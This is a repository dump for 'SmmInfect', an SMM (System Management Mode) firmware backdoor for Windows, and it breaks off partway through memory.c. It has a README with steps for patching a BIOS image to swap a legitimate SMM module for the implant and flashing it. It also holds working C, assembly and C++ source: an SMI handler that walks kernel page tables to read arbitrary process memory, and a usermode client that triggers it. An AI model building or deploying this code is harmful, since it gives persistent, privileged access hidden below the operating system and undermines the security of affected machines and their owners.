@@ -1,0 +1,1420 @@
+Project Path: arc_gmh5225_SmmInfect_4ct1jec1
+
+Source Tree:
+
+```txt
+arc_gmh5225_SmmInfect_4ct1jec1
+├── README.md
+├── SmiUm
+│   ├── SmiUm
+│   │   ├── SmiUm.vcxproj
+│   │   ├── SmiUm.vcxproj.filters
+│   │   ├── SmiUm.vcxproj.user
+│   │   └── entry.cpp
+│   └── SmiUm.sln
+├── SmmInfect
+│   ├── SmmInfect.inf
+│   ├── cache.nasm
+│   ├── communication.c
+│   ├── communication.h
+│   ├── entry.c
+│   ├── memory.c
+│   ├── memory.h
+│   ├── string.c
+│   ├── string.h
+│   ├── windows.c
+│   └── windows.h
+└── SmmInfect.dsc
+
+```
+
+`README.md`:
+
+```md
+## **About**
+
+The project aims to bring the capabilities of SMM x86-64(System Management Mode) to usermode through a backdoor. The backdoor is triggered through a syscall that invokes an SMI on most systems.
+This way, you can easily control the number of times the backdoor is triggered. The project consists of 2 modules. 
+One SMM driver that has a registered SMI root handler and a normal usermode application that invokes the SMI's and dictates what information to be transceived.
+
+## **Requirements**
+
+x86-64 processor.
+
+Windows 10/11. Linux is currently unsupported.
+
+Bios that supports [UEFI SMM variables](https://github.com/tianocore/tianocore.github.io/wiki/UEFI-Variable-Runtime-Cache)
+
+Ability to flash bios. ( bios flashback is recommended )
+
+
+## **Compiling and Installation**
+
+**Compiling**
+
+To compile the SMM driver ```SmmInfect.efi``` you will need the [edk2](https://github.com/tianocore/edk2) project and if you are on Windows you will also need [Visual studio build tools](https://stackoverflow.com/questions/40504552/how-to-install-visual-c-build-tools).
+If you are unable to setup the edk2 project on Windows here is a good [tutorial](https://www.youtube.com/watch?v=jrY4oqgHV0o).
+
+  * Place the github project inside edk2 project ```edk2/SmmInfect```
+
+  * Edit ACTIVE_PLATFORM | TARGET | TARGET_ARCH inside ```edk2/Conf/target.txt``` to SmmInfect/SmmInfect.dsc | RELEASE | X64
+
+  * Open ```Developer command promopt for VS 2022/2019``` and enter ```edksetup.bat``` then ```build```
+
+To compile the usermode program just open the visual studio solution (SmiUm folder) and build it as Release x64.
+
+If you are unable to compile there are pre-compiled binaries.
+
+**Installation**
+
+Download and install [UEFITool 0.28.0](https://github.com/LongSoft/UEFITool/releases/tag/0.28.0).
+Open UefiTool and go to File → Open image file. Choose the bios file you would like to patch.
+Now choose an appropriate SMM module to patch out. Replace this SMM module with SmmInfect.efi.
+![path: ](https://i.imgur.com/pb6r0Mu.png "patch: ")
+
+Now save this bios file and flash your bios with it.
+Then open up the usermode program to read the first 15 bytes of explorer.exe. 
+
+To find an appropriate SMM module to patch you would either have to reverse it to see if it's not necessary for operating the computer. Or insert your one.
+I am using ASUS Prime b650-plus with AMD ryzen 7 7800X3D and patching out this guid: {CE1FD2EA-F80C-4517-8A75-9F7794A1401E}
+
+## **Credits**
+Ekknod, for being a good mentor and some of his code is used. Check out his [projects](https://github.com/ekknod)
+
+```
+
+`SmiUm/SmiUm.sln`:
+
+```sln
+
+Microsoft Visual Studio Solution File, Format Version 12.00
+# Visual Studio Version 17
+VisualStudioVersion = 17.4.33213.308
+MinimumVisualStudioVersion = 10.0.40219.1
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "SmiUm", "SmiUm\SmiUm.vcxproj", "{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Debug|x64 = Debug|x64
+		Debug|x86 = Debug|x86
+		Release|x64 = Release|x64
+		Release|x86 = Release|x86
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Debug|x64.ActiveCfg = Debug|x64
+		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Debug|x64.Build.0 = Debug|x64
+		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Debug|x86.ActiveCfg = Debug|Win32
+		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Debug|x86.Build.0 = Debug|Win32
+		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Release|x64.ActiveCfg = Release|x64
+		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Release|x64.Build.0 = Release|x64
+		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Release|x86.ActiveCfg = Release|Win32
+		{5603046C-BE5E-4982-BB2E-5DFC44A64F3A}.Release|x86.Build.0 = Release|Win32
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+	GlobalSection(ExtensibilityGlobals) = postSolution
+		SolutionGuid = {66DE24F5-9FD3-4FC6-9C5C-05552F665D29}
+	EndGlobalSection
+EndGlobal
+
+```
+
+`SmiUm/SmiUm/SmiUm.vcxproj`:
+
+```vcxproj
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{5603046c-be5e-4982-bb2e-5dfc44a64f3a}</ProjectGuid>
+    <RootNamespace>SmiUm</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="entry.cpp" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
+```
+
+`SmiUm/SmiUm/SmiUm.vcxproj.filters`:
+
+```filters
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="entry.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+</Project>
+```
+
+`SmiUm/SmiUm/SmiUm.vcxproj.user`:
+
+```user
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup />
+</Project>
+```
+
+`SmiUm/SmiUm/entry.cpp`:
+
+```cpp
+#include <Windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <winnt.h>
+#include <winternl.h>
+#pragma comment(lib, "ntdll.lib")
+
+#define RTL_CONSTANT_STRING(s) { sizeof(s) - sizeof((s)[0]), sizeof(s), (PWSTR)s }
+#define EFI_VARIABLE_NON_VOLATILE                          0x00000001
+#define EFI_VARIABLE_BOOTSERVICE_ACCESS                    0x00000002
+#define EFI_VARIABLE_RUNTIME_ACCESS                        0x00000004
+extern "C"
+{
+  NTSYSAPI NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, PBOOLEAN WasEnabled);
+  NTSYSCALLAPI NTSTATUS NTAPI NtSetSystemEnvironmentValueEx(PUNICODE_STRING VariableName, LPGUID VendorGuid, PVOID Value, ULONG ValueLength, ULONG Attributes);
+}
+
+#pragma pack(1) // Ensure that alignment is 1-byte
+typedef struct _SmmCommunicationProtocol
+{
+  UINT8 magic = 'i';
+  UINT8 process_name[30] = { 0 };
+  UINT16 module_name[30] = { 0 };
+  UINT64 offset = 0;
+  UINT64 read_size = 0;
+  UINT8 read_buffer[30] = { 0 };
+  UINT64 smi_count = 2976579765;
+
+} SmmCommunicationProtocol, * PSmmCommunicationProtocol;
+#pragma pack() // reset
+
+#pragma section(".ZEPTA", read, write)
+__declspec(allocate(".ZEPTA")) volatile SmmCommunicationProtocol protocol;
+
+void TriggerSmi()
+{
+  BOOLEAN e = false;
+  const NTSTATUS status = RtlAdjustPrivilege(22L, true, false, &e);
+  
+  if (!NT_SUCCESS(status))
+  {
+    printf("No suitable permission! Open as admin!\n");
+    return;
+  }
+
+  GUID guid = { 0 };
+  UNICODE_STRING name = RTL_CONSTANT_STRING(L"ZeptaVar");
+  char buffer[8];
+  NtSetSystemEnvironmentValueEx(&name, &guid, buffer, sizeof(buffer), EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS);
+}
+
+void main()
+{
+  printf("Size of protocol %x\n", (INT)sizeof(SmmCommunicationProtocol)); // 6b
+  printf("Address of protocol %x\n", (INT)&protocol);
+
+  while (true)
+  {
+    strcpy((char*)protocol.process_name, "explorer.exe");
+    wcscpy((wchar_t*)protocol.module_name, L"explorer.exe");
+    protocol.offset = 0;//= 0x2F000;
+    protocol.read_size = 15;
+    memset((void*)protocol.read_buffer, 0, sizeof(protocol.read_buffer));
+    TriggerSmi();
+
+
+    printf("Smi count: %llu\n", protocol.smi_count);
+
+    for (int i = 0; i < protocol.read_size; i++)
+    {
+      printf("%02X ", protocol.read_buffer[i]);
+    }
+
+    Sleep(50);
+  }
+}
+
+
+
+
+```
+
+`SmmInfect.dsc`:
+
+```dsc
+[Defines]
+    PLATFORM_NAME = SmmInfect
+    PLATFORM_GUID = 07886e23-b344-468f-8a36-b91478fffacf
+    PLATFORM_VERSION = 1.000
+    DSC_SPECIFICATION = 0x0001001B
+    OUTPUT_DIRECTORY = Build/SmmInfect
+    SUPPORTED_ARCHITECTURES = X64
+    BUILD_TARGETS = RELEASE
+    SKUID_IDENTIFIER = DEFAULT
+
+[LibraryClasses.common]
+    !include MdePkg/MdeLibs.dsc.inc
+
+    BaseLib|MdePkg/Library/BaseLib/BaseLib.inf
+    BaseMemoryLib|MdePkg/Library/BaseMemoryLib/BaseMemoryLib.inf
+    DebugLib|MdePkg/Library/BaseDebugLibNull/BaseDebugLibNull.inf
+    DevicePathLib|MdePkg/Library/UefiDevicePathLib/UefiDevicePathLibOptionalDevicePathProtocol.inf
+    MemoryAllocationLib|MdePkg/Library/UefiMemoryAllocationLib/UefiMemoryAllocationLib.inf
+    PcdLib|MdePkg/Library/BasePcdLibNull/BasePcdLibNull.inf
+    PrintLib|MdePkg/Library/BasePrintLib/BasePrintLib.inf
+    UefiBootServicesTableLib|MdePkg/Library/UefiBootServicesTableLib/UefiBootServicesTableLib.inf
+    UefiLib|MdePkg/Library/UefiLib/UefiLib.inf
+    UefiRuntimeServicesTableLib|MdePkg/Library/UefiRuntimeServicesTableLib/UefiRuntimeServicesTableLib.inf
+    UefiDriverEntryPoint|MdePkg/Library/UefiDriverEntryPoint/UefiDriverEntryPoint.inf
+    DxeServicesTableLib|MdePkg/Library/DxeServicesTableLib/DxeServicesTableLib.inf
+    SmmPeriodicSmiLib|MdePkg/Library/SmmPeriodicSmiLib/SmmPeriodicSmiLib.inf
+    TimerLib|MdePkg/Library/BaseTimerLibNullTemplate/BaseTimerLibNullTemplate.inf
+    HobLib|MdePkg/Library/DxeHobLib/DxeHobLib.inf
+    SmmCpuRendezvousLib|UefiCpuPkg/Library/SmmCpuRendezvousLib/SmmCpuRendezvousLib.inf
+    MmServicesTableLib|MdePkg/Library/MmServicesTableLib/MmServicesTableLib.inf
+
+
+[LibraryClasses.common.DXE_SMM_DRIVER]
+    SmmMemLib|MdePkg/Library/SmmMemLib/SmmMemLib.inf
+    SmmServicesTableLib|MdePkg/Library/SmmServicesTableLib/SmmServicesTableLib.inf
+    IoLib|MdePkg/Library/BaseIoLibIntrinsic/BaseIoLibIntrinsic.inf
+    CcProbeLibNull|MdePkg/Library/CcProbeLibNull/CcProbeLibNull.inf
+
+[Components]
+    SmmInfect/SmmInfect/SmmInfect.inf
+```
+
+`SmmInfect/SmmInfect.inf`:
+
+```inf
+[Defines]
+    INF_VERSION = 0x00010006
+    BASE_NAME = SmmInfect
+    FILE_GUID = a1f9c242-8eb8-495f-baeb-e10a79cbfffe
+    MODULE_TYPE = DXE_SMM_DRIVER
+    VERSION_STRING = 1.0
+    ENTRY_POINT = UefiMain
+
+[Sources]
+    entry.c
+    memory.c
+    string.c
+    windows.c
+    communication.c
+    cache.nasm
+ [Packages]
+    MdePkg/MdePkg.dec
+    UefiCpuPkg/UefiCpuPkg.dec
+    MdeModulePkg/MdeModulePkg.dec
+
+[LibraryClasses]
+    UefiLib
+    SmmMemLib
+    UefiDriverEntryPoint
+    HobLib
+    SmmPeriodicSmiLib
+    TimerLib
+    IoLib
+    CcProbeLibNull
+    SmmCpuRendezvousLib
+    MmServicesTableLib
+[Guids]
+    gEfiFileInfoGuid
+    gEfiFileSystemInfoGuid
+    gEfiFileSystemVolumeLabelInfoIdGuid
+
+[Protocols]
+    gEfiSmmBase2ProtocolGuid
+    gEfiSmmPeriodicTimerDispatch2ProtocolGuid
+
+[Depex]
+    gEfiSmmPeriodicTimerDispatch2ProtocolGuid AND
+    gEfiSmmBase2ProtocolGuid
+
+```
+
+`SmmInfect/cache.nasm`:
+
+```nasm
+DEFAULT REL
+SECTION .text
+
+global ASM_PFX(DisableCache)
+ASM_PFX(DisableCache):
+  mov     rax, cr0
+  bts     rax, 30
+  btr     rax, 29
+  mov     cr0, rax
+  wbinvd
+  ret
+
+global ASM_PFX(EnableCache)
+ASM_PFX(EnableCache):
+  wbinvd
+  mov     rax, cr0
+  btr     rax, 29
+  btr     rax, 30
+  mov     cr0, rax
+  ret
+
+global ASM_PFX(ClearCache)
+ASM_PFX(ClearCache):    
+  call DisableCache
+  call EnableCache
+  ret
+```
+
+`SmmInfect/communication.c`:
+
+```c
+#pragma optimize("", off)
+#include "communication.h"
+UINT64 SmiCountIndex = 0;
+
+UINT64 GetCommunicationProcess()
+{
+	return GetEProcess("SmiUM.exe");
+}
+
+EFI_STATUS PerformCommunication()
+{
+	SmiCountIndex++;
+
+	UINT64 kernel = GetKernelBase();
+	UINT64 cr3 = GetKernelCr3();
+
+	if (!kernel || !cr3)
+	{
+		return EFI_SUCCESS;
+	}
+
+	UINT64 cprocess = GetCommunicationProcess();
+	if (cprocess)
+	{
+		UINT64 base = GetBaseAddressModuleX64(cprocess, L"SmiUM.exe");
+
+		if (base)
+		{
+			UINT64 section = GetSectionBaseAddressX64(cprocess, base, ".ZEPTA");
+
+			if (section)
+			{
+				SmmCommunicationProtocol protocol = { 0 };
+				ReadVirtual(section + 0b0, GetProcessCr3(cprocess), (UINT8*)&protocol, sizeof(SmmCommunicationProtocol));
+
+				if (protocol.magic != SMM_PROTOCOL_MAGIC)
+				{
+					return EFI_SUCCESS;
+				}
+
+				UINT64 tprocess = GetEProcess(protocol.process_name);
+
+				if (tprocess == 0)
+				{
+					return EFI_SUCCESS;
+				}
+
+				UINT64 tbase = GetBaseAddressModuleX64(tprocess, protocol.module_name);
+
+				if (tbase == 0)
+				{
+					return EFI_SUCCESS;
+				}
+
+				*(UINT64*)(TranslateVirtualToPhysical(GetProcessCr3(cprocess), section + SMI_COUNT_OFFSET)) = SmiCountIndex;
+
+				ReadVirtual(tbase + protocol.offset, GetProcessCr3(tprocess), protocol.read_buffer, protocol.read_size);
+
+				// Section starts at new frame and struct is not bigger then a page size. So we can get away with only translating one time
+				UINT64 temp = TranslateVirtualToPhysical(GetProcessCr3(cprocess), section + READ_BUFFER_OFFSET);
+
+				for (UINT64 i = 0; i < protocol.read_size; i++)
+				{
+					*(UINT8*)(temp + i) = protocol.read_buffer[i];
+				}
+			}
+		}
+	}
+	return EFI_SUCCESS;
+}
+
+#pragma optimize("", on)
+
+```
+
+`SmmInfect/communication.h`:
+
+```h
+#pragma once 
+#include "windows.h"
+#define SMM_PROTOCOL_MAGIC 'i'
+#define MAGIC_OFFSET 0
+#define PROCESS_OFFSET 1
+#define MODULE_OFFSET 31
+#define MEMORY_OFFSET 91
+#define READ_SIZE_OFFSET 99
+#define READ_BUFFER_OFFSET 107
+#define SMI_COUNT_OFFSET 137
+
+#pragma pack(1) // Ensure that alignment is 1-byte
+typedef struct _SmmCommunicationProtocol
+{
+	UINT8 magic; // offset 0
+	UINT8 process_name[30]; // offset 1
+	UINT16 module_name[30]; // offset 31
+	UINT64 offset; // offset 91
+	UINT64 read_size; // offset 99
+	UINT8 read_buffer[30]; // offset 107
+	UINT64 smi_count; // offset 137
+} SmmCommunicationProtocol, * PSmmCommunicationProtocol; // size 145
+#pragma pack() // reset
+
+UINT64 GetCommunicationProcess();
+EFI_STATUS PerformCommunication();
+```
+
+`SmmInfect/entry.c`:
+
+```c
+#pragma optimize("", off)
+#include <Library/SmmCpuRendezvousLib.h>
+#include "windows.h"
+#include "communication.h"
+
+EFI_SMM_BASE2_PROTOCOL* SmmBase2;
+EFI_SMM_SYSTEM_TABLE2* GSmst2;
+VOID EFIAPI ClearCache();
+
+EFI_STATUS EFIAPI SmiHandler(EFI_HANDLE dispatch, CONST VOID* context, VOID* buffer, UINTN* size)
+{
+	// This is redundant but is done for security reasons. rendezvous
+	if(EFI_ERROR(SmmWaitForAllProcessor(TRUE)))
+	{
+		//while(TRUE){}
+		return EFI_SUCCESS;
+	}
+
+	// Perform the actual backdoor
+	PerformCommunication();
+
+	// Make sure we are not running into a cache side channel attack. When the system leaves SMM it might clear cache.
+	//ClearCache();
+
+	return EFI_SUCCESS;
+}
+
+EFI_STATUS EFIAPI UefiMain(IN EFI_LOADED_IMAGE* image, IN EFI_SYSTEM_TABLE* table)
+{
+	gRT = table->RuntimeServices;
+	gBS = table->BootServices;
+	gST = table;
+
+	if (EFI_ERROR(gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, 0, (void**)&SmmBase2)))
+	{
+		return EFI_SUCCESS;
+	}
+
+	if (EFI_ERROR(SmmBase2->GetSmstLocation(SmmBase2, &GSmst2)))
+	{
+		return EFI_SUCCESS;
+	}
+
+	EFI_HANDLE handle;
+	GSmst2->SmiHandlerRegister(&SmiHandler, NULL, &handle);
+
+	if (EFI_ERROR(SetupMemoryMap()))
+	{
+		return EFI_ERROR_MAJOR;
+	}
+
+	return EFI_SUCCESS;
+}
+#pragma optimize("", on)
+
+```
+
+`SmmInfect/memory.c`:
+
+```c
+#pragma optimize("", off)
+#include "memory.h"
+
+UINT64 map_begin = 0x1000;
+UINT64 map_end = 0;
+
+// Clamp the virtual read to bounderies of page size.
+UINT8* ReadVirtual(UINT64 address, UINT64 cr3, UINT8* buffer, UINT64 length)
+{
+	if (buffer == NULL)
+	{
+		return NULL;
+	}
+
+	UINT64 remaining_size = length;
+	UINT64 offset = 0;
+
+	while (remaining_size > 0)
+	{
+		UINT64 physical_address = TranslateVirtualToPhysical(cr3, address + offset);
+		UINT64 page_offset = physical_address & 0xFFF;
+		UINT64 current_size = 0x1000 - page_offset;
+
+		if (current_size > remaining_size)
+		{
+			current_size = remaining_size;
+		}
+
+		if (!physical_address)
+		{
+			ZMemSet(buffer + offset, 0, current_size);
+		}
+		else
+		{
+			if (!ReadPhysical(physical_address, buffer + offset, current_size))
+			{
+				break;
+			}
+		}
+
+		offset += current_size;
+		remaining_size -= current_size;
+	}
+
+	return buffer;
+}
+
+UINT8 ReadVirtual8(UINT64 address, UINT64 cr3)
+{
+	UINT8 value = 0;
+	ReadVirtual(address, cr3, &value, sizeof(value));
+	return value;
+}
+
+UINT16 ReadVirtual16(UINT64 address, UINT64 cr3)
+{
+	UINT16 value = 0;
+	ReadVirtual(address, cr3, (UINT8*)&value, sizeof(value));
+	return value;
+}
+
+UINT32 ReadVirtual32(UINT64 address, UINT64 cr3)
+{
+	UINT32 value = 0;
+	ReadVirtual(address, cr3, (UINT8*)&value, sizeof(value));
+	return value;
+}
+UINT64 ReadVirtual64(UINT64 address, UINT64 cr3)
+{
+	UINT64 value = 0;
+	ReadVirtual(address, cr3, (UINT8*)&value, sizeof(value));
+	return value;
+}
+
+UINT8 *ReadPhysical(UINT64 address, UINT8 *buffer, UINT64 length)
+{
+  if (address == 0)
+    return NULL;
+
+  for (UINT64 i = 0; i < length; i++)
+  {
+    buffer[i] = *(UINT8 *)(address + i);
+  }
+
+  return buffer;
+}
+
+UINT8 ReadPhysical8(UINT64 address)
+{
+  return !address ? 0 : *(UINT8 *)address;
+}
+
+UINT16 ReadPhysical16(UINT64 address)
+{
+  return !address ? 0 : *(UINT16 *)address;
+}
+
+UINT32 ReadPhysical32(UINT64 address)
+{
+  return !address ? 0 : *(UINT32 *)address;
+}
+
+UINT64 ReadPhysical64(UINT64 address)
+{
+  return !address ? 0 : *(UINT64 *)address;
+}
+
+void* ZMemSet(void* ptr, int value, UINT64 num)
+{
+	unsigned char* p = (unsigned char*)ptr;
+	while (num--)
+	{
+		*p++ = (unsigned char)value;
+	}
+	return ptr;
+}
+
+#ifdef Windows
+STATIC BOOLEAN CheckLow(UINT64* pml4, UINT64* kernel_entry);
+
+EFI_STATUS SetupMemoryMap()
+{
+	UINT32 descriptor_version;
+	UINTN memory_map_size = 0;
+	EFI_MEMORY_DESCRIPTOR* memory_map = NULL;
+	UINTN map_key;
+	UINTN descriptor_size;
+	EFI_MEMORY_DESCRIPTOR* last;
+	EFI_STATUS status;
+	UINT64 end;
+
+	status = gBS->GetMemoryMap(&memory_map_size, memory_map, &map_key, &descriptor_size, &descriptor_version);
+	if (status == EFI_INVALID_PARAMETER || status == EFI_SUCCESS)
+	{
+		return EFI_ACCESS_DENIED;
+	}
+
+	status = gBS->AllocatePool(EfiBootServicesData, memory_map_size, (VOID**)&memory_map);
+
+	if (EFI_ERROR(status))
+	{
+		return status;
+	}
+
+	status = gBS->GetMemoryMap(&memory_map_size, memory_map, &map_key, &descriptor_size, &descriptor_version);
+	if (EFI_ERROR(status))
+	{
+		gBS->FreePool(memory_map);
+	}
+
+	last = (EFI_MEMORY_DESCRIPTOR*)((INT8*)memory_map + (((UINT32)memory_map_size / (UINT32)descriptor_size) * descriptor_size));
+	end = last->PhysicalStart + (last->NumberOfPages * 0x1000);
+	gBS->FreePool(memory_map);
+	map_end = end;
+	return EFI_SUCCESS;
+}
+
+BOOLEAN IsAddressValid(UINT64 address)
+{
+	return !(address < map_begin || address > map_end);
+}
+
+EFI_STATUS MemGetKernelCr3(UINT64* cr3)
+{
+	if (cr3 == NULL)
+	{
+		return EFI_INVALID_PARAMETER;
+	}
+
+	UINT64 pml4 = 0;
+	UINT64 entry = 0;
+	CheckLow(&pml4, &entry);
+
+	*cr3 = pml4;
+
+	return EFI_SUCCESS;
+}
+
+// credits ekknod
+UINT64 TranslateVirtualToPhysical(UINT64 cr3, UINT64 address)
+{
+	UINT64 v2;
+	UINT64 v3;
+	UINT64 v5;
+	UINT64 v6;
+
+	v2 = ReadPhysical64(8 * ((address >> 39) & 0x1FF) + cr3);
+	if (!v2)
+		return 0;
+
+	if ((v2 & 1) == 0)
+		return 0;
+
